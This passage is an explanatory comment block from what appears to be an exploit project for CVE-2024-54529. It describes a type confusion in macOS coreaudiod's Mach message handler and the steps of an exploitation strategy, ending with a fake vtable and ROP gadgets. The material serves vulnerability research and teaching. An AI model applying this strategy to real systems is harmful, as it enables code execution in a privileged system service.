 *   â”‚   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚
 *   â”‚   â”‚  Hardware Drivers                                           â”‚  â”‚
 *   â”‚   â”‚  AppleHDA, AppleUSBAudio, etc.                              â”‚  â”‚
 *   â”‚   â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚
 *   â”‚                                                                     â”‚
 *   â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
 *
 * The attack occurs at the MACH IPC BOUNDARY between user applications
 * and the coreaudiod daemon.
 *
 * Reference: Apple Core Audio Overview
 *   https://developer.apple.com/library/archive/documentation/MusicAudio/Conceptual/CoreAudioOverview/WhatisCoreAudio/WhatisCoreAudio.html
 *
 * -----------------------------------------------------------------------------
 * 5.2 THE HALS_OBJECT HIERARCHY
 * -----------------------------------------------------------------------------
 *
 * The Hardware Abstraction Layer Server (HALS) uses a C++ object hierarchy
 * to represent audio entities. Understanding this hierarchy is crucial for
 * understanding the type confusion vulnerability.
 *
 *   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
 *   â”‚                  HALS_OBJECT CLASS HIERARCHY                        â”‚
 *   â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
 *   â”‚                                                                     â”‚
 *   â”‚                       HALS_Object (base)                            â”‚
 *   â”‚                            â”‚                                        â”‚
 *   â”‚         â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                    â”‚
 *   â”‚         â”‚                  â”‚                  â”‚                    â”‚
 *   â”‚         â–¼                  â–¼                  â–¼                    â”‚
 *   â”‚   HALS_System        HALS_Client        HALS_PlugIn                â”‚
 *   â”‚   (type: syst)       (type: clnt)       (type: plug)               â”‚
 *   â”‚         â”‚                                    â”‚                     â”‚
 *   â”‚         â–¼                                    â–¼                     â”‚
 *   â”‚   HALS_Device â—€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ HALS_PlugIn_Object           â”‚
 *   â”‚   (type: adev/ddev)                                                â”‚
 *   â”‚         â”‚                                                          â”‚
 *   â”‚         â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                           â”‚
 *   â”‚         â–¼              â–¼              â–¼                           â”‚
 *   â”‚   HALS_Stream    HALS_Control   HALS_Box                          â”‚
 *   â”‚   (type: strm)   (type: ctrl)   (type: abox)                      â”‚
 *   â”‚                                                                    â”‚
 *   â”‚   HALS_IOContext                    HALS_Engine                    â”‚
 *   â”‚   (type: ioct)  â—€â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â–¶   (type: ngne/engi)             â”‚
 *   â”‚        â†‘                                  â†‘                        â”‚
 *   â”‚        â”‚         TYPE CONFUSION           â”‚                        â”‚
 *   â”‚        â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                        â”‚
 *   â”‚                                                                    â”‚
 *   â”‚   Handler expects 'ioct' but receives 'ngne'                       â”‚
 *   â”‚   Memory layout differs â†’ vtable at wrong offset!                  â”‚
 *   â”‚                                                                    â”‚
 *   â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
 *
 * Each HALS_Object has:
 *   - A 4-byte type identifier (e.g., 'ioct', 'ngne', 'clnt')
 *   - A unique 32-bit object ID
 *   - A vtable pointer at offset 0x0
 *   - Type-specific data at various offsets
 *
 * Object types and their FourCC codes:
 *
 *   TYPE CODE   CLASS NAME              DESCRIPTION
 *   â”€â”€â”€â”€â”€â”€â”€â”€â”€   â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€              â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 *   'syst'      HALS_System             System singleton
 *   'clnt'      HALS_Client             Client connection
 *   'plug'      HALS_PlugIn             Audio plugin
 *   'adev'      HALS_Device             Audio device
 *   'ddev'      HALS_DefaultDevice      Default device wrapper
 *   'strm'      HALS_Stream             Audio stream
 *   'ctrl'      HALS_Control            Volume/mute controls
 *   'ioct'      HALS_IOContext          I/O context (EXPECTED)
 *   'ngne'      HALS_Engine             Audio engine (PROVIDED)
 *   'engi'      HALS_Engine (variant)   Engine variant
 *   'tap '      HALS_Tap                Audio tap
 *   'abox'      HALS_Box                Aggregate box
 *
 * The vulnerability: _XIOContext_Fetch_Workgroup_Port expects 'ioct' but
 * doesn't verify the type before dereferencing offset 0x68/0x70.
 *
 * -----------------------------------------------------------------------------
 * 5.3 THE HALS_OBJECTMAP: WHERE ALL OBJECTS LIVE
 * -----------------------------------------------------------------------------
 *
 * All HALS_Objects are stored in a central ObjectMap:
 *
 *   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
 *   â”‚                       HALS_ObjectMap                                â”‚
 *   â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
 *   â”‚                                                                     â”‚
 *   â”‚   The ObjectMap is a hash table mapping object IDs to pointers:    â”‚
 *   â”‚                                                                     â”‚
 *   â”‚   ObjectID (uint32)  â†’  HALS_Object* (pointer to heap)             â”‚
 *   â”‚                                                                     â”‚
 *   â”‚   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚
 *   â”‚   â”‚  ID: 1000    â†’  0x7f8a01234500  (HALS_System)               â”‚  â”‚
 *   â”‚   â”‚  ID: 1001    â†’  0x7f8a01234600  (HALS_Client)               â”‚  â”‚
 *   â”‚   â”‚  ID: 1002    â†’  0x7f8a01234700  (HALS_Device)               â”‚  â”‚
 *   â”‚   â”‚  ID: 1003    â†’  0x7f8a01234800  (HALS_Stream)               â”‚  â”‚
 *   â”‚   â”‚  ID: 12000   â†’  0x7f8a01234900  (HALS_Engine) â—€â• Attacker   â”‚  â”‚
 *   â”‚   â”‚  ...                                                        â”‚  â”‚
 *   â”‚   â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚
 *   â”‚                                                                     â”‚
 *   â”‚   Key API: HALS_ObjectMap::CopyObjectByObjectID(objectID)          â”‚
 *   â”‚                                                                     â”‚
 *   â”‚   This function:                                                    â”‚
 *   â”‚     1. Looks up objectID in the map                                â”‚
 *   â”‚     2. Returns pointer to HALS_Object (or NULL)                    â”‚
 *   â”‚     3. DOES NOT VALIDATE THE TYPE!                                 â”‚
 *   â”‚                                                                     â”‚
 *   â”‚   The caller must validate the type, but vulnerable handlers       â”‚
 *   â”‚   failed to do this.                                               â”‚
 *   â”‚                                                                     â”‚
 *   â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
 *
 * The exploitation strategy:
 *   1. Create an HALS_Engine object (ID = X)
 *   2. Call a handler that expects HALS_IOContext
 *   3. Pass object ID X in the message
 *   4. Handler fetches Engine, treats it as IOContext
 *   5. Dereference at wrong offset â†’ controlled pointer
 *
 * -----------------------------------------------------------------------------
 * 5.4 MIG: THE MACH INTERFACE GENERATOR
 * -----------------------------------------------------------------------------
 *
 * The Mach Interface Generator (MIG) is Apple's tool for generating RPC
 * client/server code from interface definitions. Understanding MIG is
 * essential for macOS security research.
 *
 *   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
 *   â”‚                    MIG COMPILATION FLOW                             â”‚
 *   â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
 *   â”‚                                                                     â”‚
 *   â”‚   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                                       â”‚
 *   â”‚   â”‚  interface.defs        â”‚  MIG interface definition file        â”‚
 *   â”‚   â”‚  (Human-readable)      â”‚                                       â”‚
 *   â”‚   â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                                       â”‚
 *   â”‚               â”‚                                                     â”‚
 *   â”‚               â–¼  mig compiler                                       â”‚
 *   â”‚   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”      â”‚
 *   â”‚   â”‚                                                         â”‚      â”‚
 *   â”‚   â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”      â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”          â”‚      â”‚
 *   â”‚   â”‚  â”‚  Client stubs   â”‚      â”‚  Server stubs   â”‚          â”‚      â”‚
 *   â”‚   â”‚  â”‚  (sends msgs)   â”‚      â”‚  (receives msgs)â”‚          â”‚      â”‚
 *   â”‚   â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜      â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜          â”‚      â”‚
 *   â”‚   â”‚                                                         â”‚      â”‚
 *   â”‚   â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜      â”‚
 *   â”‚                                                                     â”‚
 *   â”‚   The server stubs include a SUBSYSTEM structure:                  â”‚
 *   â”‚                                                                     â”‚
 *   â”‚   struct mig_subsystem {                                           â”‚
 *   â”‚       mig_server_routine_t  server;     // Dispatch function       â”‚
 *   â”‚       mach_msg_id_t         start;      // First message ID        â”‚
 *   â”‚       mach_msg_id_t         end;        // Last message ID         â”‚
 *   â”‚       unsigned int          maxsize;    // Max message size        â”‚
 *   â”‚       vm_address_t          reserved;                              â”‚
 *   â”‚       struct routine_descriptor                                    â”‚
 *   â”‚           routine[end - start + 1];     // Handler table           â”‚
 *   â”‚   };                                                               â”‚
 *   â”‚                                                                     â”‚
 *   â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
 *
 * For coreaudiod, the subsystem is _HALB_MIGServer_subsystem:
 *
 *   Message ID Range: 1010000 - 1010071 (72 handlers)
 *
 *   Selected handlers (from helpers/message_ids.h):
 *
 *   ID          Handler Name                    Description
 *   â”€â”€â”€â”€â”€â”€â”€â”€â”€   â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€    â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 *   1010000     XSystem_Initialize              System initialization
 *   1010002     XSystem_GetObjectInfo           Get object type/info
 *   1010003     XSystem_CreateMetaDevice        Create aggregate device
 *   1010005     XSystem_Open                    Client registration
 *   1010027     XDevice_CreateIOContext         Create I/O context
 *   1010059     XIOContext_Fetch_Workgroup_Port Get workgroup port â—€â• BUG
 *   1010060     XIOContext_Start                Start I/O context
 *   1010061     XIOContext_StartAtTime          Start at specific time
 *   1010062     XIOContext_Start_With_WorkInterval  Start with interval
 *   1010063     XIOContext_SetClientControlPort Set control port
 *   1010064     XIOContext_Stop                 Stop I/O context
 *
 * The dispatch flow:
 *
 *   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
 *   â”‚                    MESSAGE DISPATCH FLOW                            â”‚
 *   â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
 *   â”‚                                                                     â”‚
 *   â”‚   1. Client sends message with msgh_id = 1010059                   â”‚
 *   â”‚                                                                     â”‚
 *   â”‚   2. Kernel delivers to coreaudiod's Mach port                     â”‚
 *   â”‚                                                                     â”‚
 *   â”‚   3. coreaudiod calls mach_msg_server() loop                       â”‚
 *   â”‚                                                                     â”‚
 *   â”‚   4. _HALB_MIGServer_server() is invoked                           â”‚
 *   â”‚      â”‚                                                              â”‚
 *   â”‚      â”œâ”€â”€ Check: 1010000 â‰¤ msgh_id â‰¤ 1010071                        â”‚
 *   â”‚      â”‚                                                              â”‚
 *   â”‚      â”œâ”€â”€ Index = msgh_id - 1010000 = 59                            â”‚
 *   â”‚      â”‚                                                              â”‚
 *   â”‚      â””â”€â”€ Call routine[59].stub_routine(msg)                        â”‚
 *   â”‚                                                                     â”‚
 *   â”‚   5. _XIOContext_Fetch_Workgroup_Port() executes                   â”‚
 *   â”‚      â”‚                                                              â”‚
 *   â”‚      â”œâ”€â”€ Extract object_id from message                            â”‚
 *   â”‚      â”‚                                                              â”‚
 *   â”‚      â”œâ”€â”€ obj = HALS_ObjectMap::CopyObjectByObjectID(object_id)     â”‚
 *   â”‚      â”‚                                                              â”‚
 *   â”‚      â”œâ”€â”€ NO TYPE CHECK! Assumes obj is HALS_IOContext              â”‚
 *   â”‚      â”‚                                                              â”‚
 *   â”‚      â””â”€â”€ Dereference obj->offset_0x68 â†’ TYPE CONFUSION             â”‚
 *   â”‚                                                                     â”‚
 *   â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
 *
 * -----------------------------------------------------------------------------
 * 5.5 OBJECT MEMORY LAYOUTS AND THE CONFUSION
 * -----------------------------------------------------------------------------
 *
 * The type confusion occurs because different object types have different
 * memory layouts. When the handler treats an Engine as an IOContext, it
 * reads/writes at wrong offsets.
 *
 *   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
 *   â”‚              MEMORY LAYOUT COMPARISON                               â”‚
 *   â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
 *   â”‚                                                                     â”‚
 *   â”‚   HALS_IOContext ('ioct')           HALS_Engine ('ngne')            â”‚
 *   â”‚   Expected by handler               Provided by attacker            â”‚
 *   â”‚                                                                     â”‚
 *   â”‚   Offset  Field                     Offset  Field                   â”‚
 *   â”‚   â”€â”€â”€â”€â”€â”€  â”€â”€â”€â”€â”€                     â”€â”€â”€â”€â”€â”€  â”€â”€â”€â”€â”€                   â”‚
 *   â”‚   0x00    vtable ptr                0x00    vtable ptr              â”‚
 *   â”‚   0x08    refcount                  0x08    refcount                â”‚
 *   â”‚   0x10    object_id                 0x10    object_id               â”‚
 *   â”‚   0x18    type ('ioct')             0x18    type ('ngne')           â”‚
 *   â”‚   ...     [IOContext fields]        ...     [Engine fields]         â”‚
 *   â”‚   0x68    workgroup_port_ptr â—€â”€â”€â”€â”€â”€ 0x68    ??? (uninitialized!)   â”‚
 *   â”‚           â†‘                                                         â”‚
 *   â”‚           Handler reads this,                                       â”‚
 *   â”‚           expects pointer to                                        â”‚
 *   â”‚           workgroup port info                                       â”‚
 *   â”‚                                                                     â”‚
 *   â”‚   When Guard Malloc PreScribble is enabled:                        â”‚
 *   â”‚   Offset 0x68 of Engine contains 0xAAAAAAAAAAAAAAAA                â”‚
 *   â”‚                                                                     â”‚
 *   â”‚   The handler then does:                                           â”‚
 *   â”‚     ptr = *(obj + 0x68)         // Reads 0xAAAAAAAAAAAAAAAA        â”‚
 *   â”‚     result = ptr->vtable[N]()   // Dereferences bad pointer!       â”‚
 *   â”‚                                                                     â”‚
 *   â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
 *
 * This is why the crash shows access to 0xAAAAAAAAAAAAAAAA - the
 * uninitialized memory in the Engine object is read as a pointer.
 *
 * For exploitation, we need to:
 *   1. Control what's at offset 0x68 of our Engine object
 *   2. Place a fake vtable at that address
 *   3. Have the fake vtable point to our ROP gadgets
 *
 * -----------------------------------------------------------------------------
 * 5.6 THE CLIENT REGISTRATION PROTOCOL
 * -----------------------------------------------------------------------------
 *
 * Before sending most messages, a client must register with coreaudiod:
 *
 *   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
 *   â”‚              CLIENT REGISTRATION SEQUENCE                           â”‚
 *   â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
 *   â”‚                                                                     â”‚
 *   â”‚   CLIENT                                   COREAUDIOD               â”‚
 *   â”‚   â”€â”€â”€â”€â”€â”€                                   â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€               â”‚
 *   â”‚                                                                     â”‚
 *   â”‚   1. bootstrap_look_up("com.apple.audio.audiohald", &port)         â”‚
 *   â”‚      â”‚                                                              â”‚
 *   â”‚      â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â–¶  (get service port) â”‚
 *   â”‚                                                                     â”‚
 *   â”‚   2. Send XSystem_Open message (ID: 1010005)                       â”‚
 *   â”‚      â”‚                                                              â”‚
 *   â”‚      â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                       â”‚
 *   â”‚      â”‚  â”‚ header.msgh_id = 1010005         â”‚                       â”‚
 *   â”‚      â”‚  â”‚ body = { client info }           â”‚                       â”‚
 *   â”‚      â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                       â”‚
 *   â”‚      â”‚                                                              â”‚
 *   â”‚      â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â–¶                     â”‚
 *   â”‚                                                                     â”‚
 *   â”‚   3. coreaudiod creates HALS_Client object                         â”‚
 *   â”‚      â”‚                                                              â”‚
 *   â”‚      â”‚  HALS_System::AddClient()                                   â”‚
 *   â”‚      â”‚  â”œâ”€â”€ Verify audit token                                     â”‚
 *   â”‚      â”‚  â”œâ”€â”€ Create HALS_Client (type: 'clnt')                      â”‚
 *   â”‚      â”‚  â”œâ”€â”€ Add to ObjectMap                                       â”‚
 *   â”‚      â”‚  â””â”€â”€ Return client_id to caller                             â”‚
 *   â”‚      â”‚                                                              â”‚
 *   â”‚      â—€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€                      â”‚
 *   â”‚                                                                     â”‚
 *   â”‚   4. Client can now send other messages                            â”‚
 *   â”‚      using the returned client_id                                  â”‚
 *   â”‚                                                                     â”‚
 *   â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
 *
 * After registration, the client can:
 *   - Query devices (XSystem_GetObjectInfo)
 *   - Create meta devices (XSystem_CreateMetaDevice)
 *   - Create I/O contexts (XDevice_CreateIOContext)
 *   - And much more...
 *
 * Reference: Project Zero blog on CoreAudio
 *   https://projectzero.google/2025/05/breaking-sound-barrier-part-i-fuzzing.html
 *
 * =============================================================================
 * =============================================================================
 * PART 6: BUG HUNTING METHODOLOGY CASE STUDY
 * =============================================================================
 * =============================================================================
 *
 * This section documents how CVE-2024-54529 was discovered, providing a
 * template for finding similar vulnerabilities in other services.
 *
 * -----------------------------------------------------------------------------
 * 6.1 KNOWLEDGE-DRIVEN FUZZING
 * -----------------------------------------------------------------------------
 *
 * Traditional "dumb" fuzzing throws random bytes at targets. Knowledge-driven
 * fuzzing uses understanding of the target to generate smarter inputs.
 *
 *   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
 *   â”‚            FUZZING EVOLUTION                                        â”‚
 *   â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
 *   â”‚                                                                     â”‚
 *   â”‚   GENERATION 1: Dumb Fuzzing                                        â”‚
 *   â”‚   â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€                                         â”‚
 *   â”‚   â€¢ Random byte flipping                                            â”‚
 *   â”‚   â€¢ No understanding of format                                      â”‚
 *   â”‚   â€¢ Most inputs rejected immediately                                â”‚
 *   â”‚   â€¢ Very low coverage                                               â”‚
 *   â”‚                                                                     â”‚
